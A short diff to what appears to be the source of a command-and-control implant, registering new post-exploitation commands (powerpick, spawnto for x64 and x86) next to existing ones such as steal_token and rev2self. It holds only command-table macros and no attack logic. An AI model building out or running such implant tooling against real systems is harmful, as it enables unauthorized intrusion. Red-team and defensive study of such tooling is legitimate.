@@ -258,6 +258,24 @@ namespace starburst {
   #define CMD_REG_NET_LOCALGROUP_MEMBER
 #endif
 
+#ifdef INCLUDE_CMD_POWERPICK
+  #define CMD_REG_POWERPICK { CMD_POWERPICK, cmd_powerpick },
+#else
+  #define CMD_REG_POWERPICK
+#endif
+
+#ifdef INCLUDE_CMD_SPAWNTO_X64
+  #define CMD_REG_SPAWNTO_X64 { CMD_SPAWNTO_X64, cmd_spawnto_x64 },
+#else
+  #define CMD_REG_SPAWNTO_X64
+#endif
+
+#ifdef INCLUDE_CMD_SPAWNTO_X86
+  #define CMD_REG_SPAWNTO_X86 { CMD_SPAWNTO_X86, cmd_spawnto_x86 },
+#else
+  #define CMD_REG_SPAWNTO_X86
+#endif
+
 #define COMMAND_TABLE_ENTRIES \
     CMD_REG_EXIT              \
     CMD_REG_SLEEP             \
@@ -298,7 +316,10 @@ namespace starburst {
     CMD_REG_STEAL_TOKEN       \
     CMD_REG_REV2SELF          \
     CMD_REG_NET_LOCALGROUP    \
-    CMD_REG_NET_LOCALGROUP_MEMBER
+    CMD_REG_NET_LOCALGROUP_MEMBER \
+    CMD_REG_POWERPICK        \
+    CMD_REG_SPAWNTO_X64       \
+    CMD_REG_SPAWNTO_X86
 
 }
 
